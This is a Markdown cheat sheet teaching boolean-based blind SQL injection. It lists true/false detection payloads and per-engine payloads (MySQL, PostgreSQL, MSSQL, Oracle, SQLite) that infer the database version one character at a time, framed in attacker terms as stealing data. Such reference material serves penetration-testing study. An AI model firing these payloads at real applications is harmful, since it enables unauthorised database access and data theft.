# Blind SQLi Cheat Sheet
## Boolean-Based Blind SQLi

**Overview:** Boolean-Based SQLi is an inferential attack. The application does not return database errors or print data to the screen. Instead, you inject mathematically True or False statements and observe if the webpage changes visually (e.g., missing text, broken images, or a "0 results found" message).

---

## Step 1: The True/False Detection Test
Inject these payloads to see if the application's response changes based on the mathematical outcome.

| Database Engine | The "True" Payload (Normal Page) | The "False" Payload (Broken/Missing Page) |
| :--- | :--- | :--- |
| **MySQL** | `' AND 1=1--+` | `' AND 1=2--+` |
| **MSSQL / Postgres / Oracle / SQLite** | `' AND 1=1--` | `' AND 1=2--` |

*(If the page looks identical for both 1=1 and 1=2, Boolean SQLi is NOT possible. You must pivot to Time-Based).*

---

## Step 2: The Data Extraction Blueprint
To extract data, you play "20 Questions" with the database. You isolate one single character of the data you want to steal, and ask if it equals a specific letter.

**The Logic Formula:**
`' AND (Extract the 1st letter of the database version) = 'a'--`

###  Pro-Tip: Use ASCII Conversion
Guessing literal letters (`'a'`) can cause case-sensitivity failures. Professional attackers convert the letter into its numerical ASCII value first.
* *Question:* "Is the ASCII value of the first letter 97?" (97 is the decimal value for lowercase 'a').

---

## Step 3: Database-Specific Extraction Payloads
Here is how to isolate and guess the first character (ASCII `97` / 'a') of the database version across all major engines.

###  MySQL
Uses `SUBSTRING()` to isolate the letter, and `ASCII()` to convert it to a number.
sql
' AND ASCII(SUBSTRING(version(), 1, 1)) = 97--+

*(To guess the 2nd letter, change it to SUBSTRING(version(), 2, 1)).*

### PostgreSQL

Syntax is identical to MySQL, but uses the `--` comment.

SQL

`' AND ASCII(SUBSTRING(version(), 1, 1)) = 97--`

### Microsoft SQL Server (MSSQL)

Uses `@@version`.

SQL

`' AND ASCII(SUBSTRING(@@version, 1, 1)) = 97--`

### Oracle

Oracle uses `SUBSTR()` instead of `SUBSTRING()`. Remember you must query `v$version`.

SQL

`' AND ASCII(SUBSTR((SELECT banner FROM v$version WHERE ROWNUM=1), 1, 1)) = 97--`

### SQLite

SQLite does not have an `ASCII()` function built-in, so you must guess the literal characters or use `HEX()` conversion.

SQL

`' AND SUBSTR(sqlite_version(), 1, 1) = '3'--`